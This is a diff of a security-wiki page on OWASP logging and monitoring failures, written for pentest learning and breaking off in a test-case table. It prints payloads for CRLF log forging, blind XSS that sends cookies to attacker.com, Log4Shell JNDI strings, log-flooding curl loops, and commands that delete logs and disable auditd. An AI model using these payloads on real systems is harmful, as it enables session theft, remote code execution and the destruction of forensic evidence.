@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Security Logging &amp; Monitoring Failures # (OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)
-Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a &ldquo;silent&rdquo; vulnerability — it doesn&rsquo;t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: 241 days (IBM Cost of a Data Breach Report).">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Security Logging and Monitoring Failures" />
-<meta property="og:description" content="Security Logging &amp; Monitoring Failures # (OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)
-Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a &ldquo;silent&rdquo; vulnerability — it doesn&rsquo;t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: 241 days (IBM Cost of a Data Breach Report)." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Security Logging and Monitoring Failures | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Security Logging &amp; Monitoring Failures# (OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)
+Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a “silent” vulnerability — it doesn’t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: 241 days (IBM Cost of a Data Breach Report).
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Security Logging and Monitoring Failures">
+	<meta property="og:description" content="Security Logging &amp; Monitoring Failures# (OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)
+Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a “silent” vulnerability — it doesn’t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: 241 days (IBM Cost of a Data Breach Report).">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Security Logging and Monitoring Failures">
+	<meta itemprop="description" content="Security Logging &amp; Monitoring Failures# (OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)
+Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a “silent” vulnerability — it doesn’t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: 241 days (IBM Cost of a Data Breach Report).">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1602">
+
+<title>Security Logging and Monitoring Failures • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Security Logging and Monitoring Failures</strong>
+  <h3>Security Logging and Monitoring Failures</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1283,30 +1281,18 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="security-logging--monitoring-failures">
-  Security Logging &amp; Monitoring Failures
-  <a class="anchor" href="#security-logging--monitoring-failures">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="security-logging--monitoring-failures">Security Logging &amp; Monitoring Failures<a class="anchor" href="#security-logging--monitoring-failures">#</a></h1>
 <p><strong>(OWASP Top 10 A09:2021 — formerly Insufficient Logging &amp; Monitoring)</strong></p>
 <p>Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a &ldquo;silent&rdquo; vulnerability — it doesn&rsquo;t enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: <strong>241 days</strong> (IBM Cost of a Data Breach Report).</p>
-<h2 id="understanding-the-basics">
-  Understanding the Basics
-  <a class="anchor" href="#understanding-the-basics">#</a>
-</h2>
-<h3 id="the-visibility-gap">
-  The Visibility Gap
-  <a class="anchor" href="#the-visibility-gap">#</a>
-</h3>
+<h2 id="understanding-the-basics">Understanding the Basics<a class="anchor" href="#understanding-the-basics">#</a></h2>
+<h3 id="the-visibility-gap">The Visibility Gap<a class="anchor" href="#the-visibility-gap">#</a></h3>
 <p>Failures typically occur in three stages:</p>
 <ol>
 <li><strong>Generation Failure</strong> — No log entry created for critical events (failed logins, privilege escalations, permission changes)</li>
 <li><strong>Storage Failure</strong> — Logs exist but stored locally on the compromised server, easily deleted or overwritten</li>
 <li><strong>Monitoring Failure</strong> — Logs generated and preserved but unmonitored — no SIEM rules, no alerting, no correlation</li>
 </ol>
-<h3 id="common-logging-antipatterns">
-  Common Logging Antipatterns
-  <a class="anchor" href="#common-logging-antipatterns">#</a>
-</h3>
+<h3 id="common-logging-antipatterns">Common Logging Antipatterns<a class="anchor" href="#common-logging-antipatterns">#</a></h3>
 <ul>
 <li>Logging sensitive data in plaintext — passwords, tokens, API keys, PII → creates new exposure</li>
 <li>Vague entries — generic <code>Error 500</code> with no user ID, IP, timestamp, or context</li>
@@ -1314,10 +1300,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Decentralized logs — stored per server/container, preventing cross-system correlation</li>
 <li>No structured format — hinders automated parsing and SIEM ingestion</li>
 </ul>
-<h2 id="attack-surface--what-goes-undetected">
-  Attack Surface &amp; What Goes Undetected
-  <a class="anchor" href="#attack-surface--what-goes-undetected">#</a>
-</h2>
+<h2 id="attack-surface--what-goes-undetected">Attack Surface &amp; What Goes Undetected<a class="anchor" href="#attack-surface--what-goes-undetected">#</a></h2>
 <ul>
 <li><strong>Authentication endpoints</strong> — Credential stuffing, brute force across many IPs with no alert</li>
 <li><strong>Authorization failures</strong> — IDOR: user iterating thousands of unauthorized resource IDs silently</li>
@@ -1328,57 +1311,36 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Data access events</strong> — PII/PHI records read or exported in bulk with no audit trail</li>
 <li><strong>API key usage</strong> — Key generation, rotation, or high-volume API calls with no visibility</li>
 </ul>
-<h2 id="exploiting-logging-failures">
-  Exploiting Logging Failures
-  <a class="anchor" href="#exploiting-logging-failures">#</a>
-</h2>
-<h3 id="1-crlf-injection--log-forging">
-  1. CRLF Injection / Log Forging
-  <a class="anchor" href="#1-crlf-injection--log-forging">#</a>
-</h3>
+<h2 id="exploiting-logging-failures">Exploiting Logging Failures<a class="anchor" href="#exploiting-logging-failures">#</a></h2>
+<h3 id="1-crlf-injection--log-forging">1. CRLF Injection / Log Forging<a class="anchor" href="#1-crlf-injection--log-forging">#</a></h3>
 <p>Inject <code>\r\n</code> characters into user-controlled input to write fake log entries, framing other users or hiding malicious activity.</p>
-<pre tabindex="0"><code>GET /search?q=normaluser%0d%0a[2024-01-01 12:00:00] INFO User admin logged in successfully HTTP/1.1
-</code></pre><pre tabindex="0"><code>Injected log output:
+<pre tabindex="0"><code>GET /search?q=normaluser%0d%0a[2024-01-01 12:00:00] INFO User admin logged in successfully HTTP/1.1</code></pre><pre tabindex="0"><code>Injected log output:
 [2024-01-01 11:59:59] INFO Search query: normaluser
-[2024-01-01 12:00:00] INFO User admin logged in successfully   ← forged entry
-</code></pre><p>Payloads:</p>
+[2024-01-01 12:00:00] INFO User admin logged in successfully   ← forged entry</code></pre><p>Payloads:</p>
 <pre tabindex="0"><code>%0d%0a          → CRLF
 %0a             → LF only
 \r\n            → raw CRLF (in JSON/XML body)
-admin%0aINFO:+Login+successful
-</code></pre><h3 id="2-siem-blind-xss-via-log-injection">
-  2. SIEM Blind XSS via Log Injection
-  <a class="anchor" href="#2-siem-blind-xss-via-log-injection">#</a>
-</h3>
+admin%0aINFO:+Login+successful</code></pre><h3 id="2-siem-blind-xss-via-log-injection">2. SIEM Blind XSS via Log Injection<a class="anchor" href="#2-siem-blind-xss-via-log-injection">#</a></h3>
 <p>If logs are rendered in a web-based SIEM or admin dashboard without sanitization, inject XSS payloads that fire when a security analyst views the log entry.</p>
 <pre tabindex="0"><code>GET /login HTTP/1.1
 User-Agent: &lt;script src=&#34;https://attacker.com/blind.js&#34;&gt;&lt;/script&gt;
-X-Forwarded-For: &#34;&gt;&lt;img src=x onerror=fetch(&#39;https://attacker.com/?c=&#39;+document.cookie)&gt;
-</code></pre><pre tabindex="0"><code># Payload in username field at login
-username=admin&lt;script&gt;new Image().src=&#39;https://attacker.com/?c=&#39;+document.cookie&lt;/script&gt;
-</code></pre><p>When a SOC analyst opens the log viewer → payload executes in their browser → session hijacked.</p>
-<h3 id="3-log-flooding--noise-injection">
-  3. Log Flooding / Noise Injection
-  <a class="anchor" href="#3-log-flooding--noise-injection">#</a>
-</h3>
+X-Forwarded-For: &#34;&gt;&lt;img src=x onerror=fetch(&#39;https://attacker.com/?c=&#39;+document.cookie)&gt;</code></pre><pre tabindex="0"><code># Payload in username field at login
+username=admin&lt;script&gt;new Image().src=&#39;https://attacker.com/?c=&#39;+document.cookie&lt;/script&gt;</code></pre><p>When a SOC analyst opens the log viewer → payload executes in their browser → session hijacked.</p>
+<h3 id="3-log-flooding--noise-injection">3. Log Flooding / Noise Injection<a class="anchor" href="#3-log-flooding--noise-injection">#</a></h3>
 <p>Overwhelm the logging system with high-volume junk events to exhaust storage, trigger log rotation (overwriting older entries), or bury real attack activity in noise.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Flood login endpoint to exhaust log storage and bury real events</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Flood login endpoint to exhaust log storage and bury real events</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 100000<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -s -o /dev/null -X POST https://target.com/login <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#34;username=noise</span>$i<span style="color:#e6db74">&amp;password=junk&#34;</span>
+</span></span></span><span style="display:flex;"><span>    -d <span style="color:#e6db74">&#34;username=noise</span>$i<span style="color:#e6db74">&amp;password=junk&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Flood with crafted entries to push real events out of retention window</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -s <span style="color:#e6db74">&#34;https://target.com/search?q=</span><span style="color:#66d9ef">$(</span>cat /dev/urandom | tr -dc <span style="color:#e6db74">&#39;a-z&#39;</span> | head -c 8<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><p>Effect: real attacker activity (e.g., actual credential stuffing hits) rotates out of logs before detection.</p>
-<h3 id="4-insecure-log-storage--log-exposure">
-  4. Insecure Log Storage / Log Exposure
-  <a class="anchor" href="#4-insecure-log-storage--log-exposure">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span></span></span></code></pre></div><p>Effect: real attacker activity (e.g., actual credential stuffing hits) rotates out of logs before detection.</p>
+<h3 id="4-insecure-log-storage--log-exposure">4. Insecure Log Storage / Log Exposure<a class="anchor" href="#4-insecure-log-storage--log-exposure">#</a></h3>
 <p>Logs stored in web-accessible directories or with weak permissions can be directly read by attackers — leaking session tokens, internal IPs, stack traces, and credentials.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Common exposed log paths to probe</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Common exposed log paths to probe</span>
 </span></span><span style="display:flex;"><span>/logs/app.log
 </span></span><span style="display:flex;"><span>/var/log/nginx/access.log
 </span></span><span style="display:flex;"><span>/storage/logs/laravel.log
@@ -1389,17 +1351,12 @@ username=admin&lt;script&gt;new Image().src=&#39;https://attacker.com/?c=&#39;+d
 </span></span><span style="display:flex;"><span>/admin/logs/view
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Directory brute force for log files</span>
-</span></span><span style="display:flex;"><span>ffuf -u https://target.com/FUZZ -w log-paths.txt -mc <span style="color:#ae81ff">200</span>
-</span></span></code></pre></div><p>Exposed log contents to look for:</p>
+</span></span><span style="display:flex;"><span>ffuf -u https://target.com/FUZZ -w log-paths.txt -mc <span style="color:#ae81ff">200</span></span></span></code></pre></div><p>Exposed log contents to look for:</p>
 <pre tabindex="0"><code>[ERROR] Login failed for user admin — password: hunter2   ← plaintext credential in log
 [DEBUG] DB query: SELECT * FROM users WHERE id=1          ← internal query exposure
-[INFO] Token issued: eyJhbGc...                           ← JWT leaked in log
-</code></pre><h3 id="5-log-deletion--tampering-post-compromise">
-  5. Log Deletion / Tampering (Post-Compromise)
-  <a class="anchor" href="#5-log-deletion--tampering-post-compromise">#</a>
-</h3>
+[INFO] Token issued: eyJhbGc...                           ← JWT leaked in log</code></pre><h3 id="5-log-deletion--tampering-post-compromise">5. Log Deletion / Tampering (Post-Compromise)<a class="anchor" href="#5-log-deletion--tampering-post-compromise">#</a></h3>
 <p>After gaining access, attackers clear or truncate logs to destroy forensic evidence.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Clear system logs</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Clear system logs</span>
 </span></span><span style="display:flex;"><span>rm -rf /var/log/*
 </span></span><span style="display:flex;"><span>truncate -s <span style="color:#ae81ff">0</span> /var/log/auth.log
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;&#34;</span> &gt; /var/log/apache2/access.log
@@ -1409,11 +1366,7 @@ username=admin&lt;script&gt;new Image().src=&#39;https://attacker.com/?c=&#39;+d
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable logging service</span>
 </span></span><span style="display:flex;"><span>service rsyslog stop
-</span></span><span style="display:flex;"><span>systemctl disable auditd
-</span></span></code></pre></div><h3 id="6-log4shell-insecure-logger--cve-2021-44228">
-  6. Log4Shell (Insecure Logger — CVE-2021-44228)
-  <a class="anchor" href="#6-log4shell-insecure-logger--cve-2021-44228">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>systemctl disable auditd</span></span></code></pre></div><h3 id="6-log4shell-insecure-logger--cve-2021-44228">6. Log4Shell (Insecure Logger — CVE-2021-44228)<a class="anchor" href="#6-log4shell-insecure-logger--cve-2021-44228">#</a></h3>
 <p>Malicious input passed to a vulnerable Log4j logger triggers JNDI lookup — leading to remote code execution. Any user-controlled string that reaches a <code>log.info()</code>, <code>log.error()</code> call is a potential vector.</p>
 <pre tabindex="0"><code># JNDI injection payload in any logged field
 ${jndi:ldap://attacker.com/exploit}
@@ -1423,164 +1376,137 @@ ${${lower:j}ndi:${lower:l}dap://attacker.com/a}   ← obfuscated bypass
 # Common injection points (headers, parameters, body fields)
 User-Agent: ${jndi:ldap://attacker.com/x}
 X-Forwarded-For: ${jndi:ldap://attacker.com/x}
-username=${jndi:ldap://attacker.com/x}
-</code></pre><p>Test for blind execution (DNS callback):</p>
+username=${jndi:ldap://attacker.com/x}</code></pre><p>Test for blind execution (DNS callback):</p>
 <pre tabindex="0"><code>${jndi:dns://your.burpcollaborator.net/test}
-# DNS hit confirms vulnerable logger
-</code></pre><h3 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h3>
+# DNS hit confirms vulnerable logger</code></pre><h3 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Action</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Brute Force Detection</td>
-<td>20+ failed logins on one account</td>
-<td>Alert triggered in SIEM / SOC dashboard</td>
-</tr>
-<tr>
-<td>CRLF Injection</td>
-<td>Inject <code>%0d%0a</code> in URL parameter</td>
-<td>Forged log entry appears in log output</td>
-</tr>
-<tr>
-<td>Blind XSS via Log</td>
-<td>Inject <code>&lt;script&gt;</code> in <code>User-Agent</code></td>
-<td>Payload fires when analyst views log dashboard</td>
-</tr>
-<tr>
-<td>Log Flooding</td>
-<td>100,000 junk requests in rapid succession</td>
-<td>Real events pushed out of retention window</td>
-</tr>
-<tr>
-<td>Exposed Log Path</td>
-<td>Probe <code>/logs/app.log</code>, <code>/storage/logs/</code></td>
-<td>Log file directly accessible over HTTP</td>
-</tr>
-<tr>
-<td>Log4Shell</td>
-<td><code>${jndi:ldap://attacker.com/x}</code> in <code>User-Agent</code></td>
-<td>DNS/LDAP callback confirms RCE vector</td>
-</tr>
-<tr>
-<td>Sensitive Data in Logs</td>
-<td>Perform login; inspect resulting log entry</td>
-<td>No passwords, tokens, or PII visible</td>
-</tr>
-<tr>
-<td>Log Deletion</td>
